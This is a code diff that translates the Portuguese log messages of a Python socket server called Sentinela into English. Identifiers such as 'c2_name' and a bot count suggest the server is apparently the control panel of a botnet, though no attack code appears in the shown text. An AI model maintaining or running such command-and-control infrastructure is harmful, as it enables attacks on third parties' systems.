@@ -36,7 +36,7 @@ logging.basicConfig(
 
 class SentinelaServer:
     def __init__(self):
-        logging.info("Inicializando servidor Sentinela")
+        logging.info("Initializing Sentinela server...")
         self.config = configs()
         self.global_limits = self.config.get("global_limits", {})
         server_config = self.config.get("server", {})
@@ -135,10 +135,10 @@ class SentinelaServer:
             self.command_handler = CommandHandler(self)
     
     def start(self):
-        logging.info(f"Iniciando servidor {self.c2_name} em {self.host}:{self.port}")
+        logging.info(f"Starting server {self.c2_name} on {self.host}:{self.port}")
         
         if not (1 <= self.port <= 65535):
-            logging.error("Porta inválida")
+            logging.error("Invalid port")
             return False
         
         self.sock = create_server_socket()
@@ -148,7 +148,7 @@ class SentinelaServer:
         try:
             self.sock.bind((self.host, self.port))
         except Exception as e:
-            logging.error(f"Erro ao abrir porta: {e}")
+            logging.error(f"Error opening port: {e}")
             return False
         
         self.sock.listen()
@@ -160,9 +160,8 @@ class SentinelaServer:
         threading.Thread(target=self._cleanup_sessions_loop, daemon=True).start()
         threading.Thread(target=self._cleanup_rate_limits_loop, daemon=True).start()
         
-        logging.info(f"Servidor {self.c2_name} online!")
-        print(f"\n[+] {self.c2_name} está online em {self.host}:{self.port}!\n")
-        
+        logging.info(f"Server {self.c2_name} online!")
+
         while True:
             try:
                 client, address = self.sock.accept()
@@ -171,7 +170,7 @@ class SentinelaServer:
             except socket.timeout:
                 continue
             except Exception as e:
-                logging.error(f"Erro ao aceitar conexão: {e}")
+                logging.error(f"Error accepting connection: {e}")
         
         return True
     
@@ -203,13 +202,13 @@ class SentinelaServer:
             
             if not login(username, password):
                 self.send(client, Fore.RED + 'Invalid credentials')
-                logging.warning(f"Tentativa de login falhou: {sanitize_log(username)} de {address[0]}")
+                logging.warning(f"Login attempt failed: {sanitize_log(username)} from {address[0]}")
                 time.sleep(1)
                 client.close()
                 return
             
             session_token = self.session_manager.create(username, address)
-            logging.info(f"Usuário logado: {sanitize_log(username)} de {address[0]}")
+            logging.info(f"User logged in: {sanitize_log(username)} from {address[0]}")
             
             with self.locks['clients']:
                 self.clients[client] = {'address': address, 'session': session_token}
@@ -218,7 +217,7 @@ class SentinelaServer:
             threading.Thread(target=self._command_line_loop, args=(client, username, session_token), daemon=True).start()
         
         except Exception as e:
-            logging.error(f"Erro ao processar cliente: {str(e)[:100]}")
+            logging.error(f"Error processing client: {str(e)[:100]}")
             try:
                 client.close()
             except:
@@ -320,7 +319,7 @@ class SentinelaServer:
                 self.send(client, prompt, False)
         
         except Exception as e:
-            logging.error(f"Erro na linha de comando: {str(e)[:100]}")
+            logging.error(f"Error in command line: {str(e)[:100]}")
         finally:
             try:
                 client.close()
@@ -330,7 +329,7 @@ class SentinelaServer:
                 if client in self.clients:
                     del self.clients[client]
             self.session_manager.remove(session_token)
-            logging.info(f"Cliente desconectado: {sanitize_log(username)}")
+            logging.info(f"Client disconnected: {sanitize_log(username)}")
     
     def return_banner(self, client, username, user_data):
         bots_count = self.bot_manager.get_count()
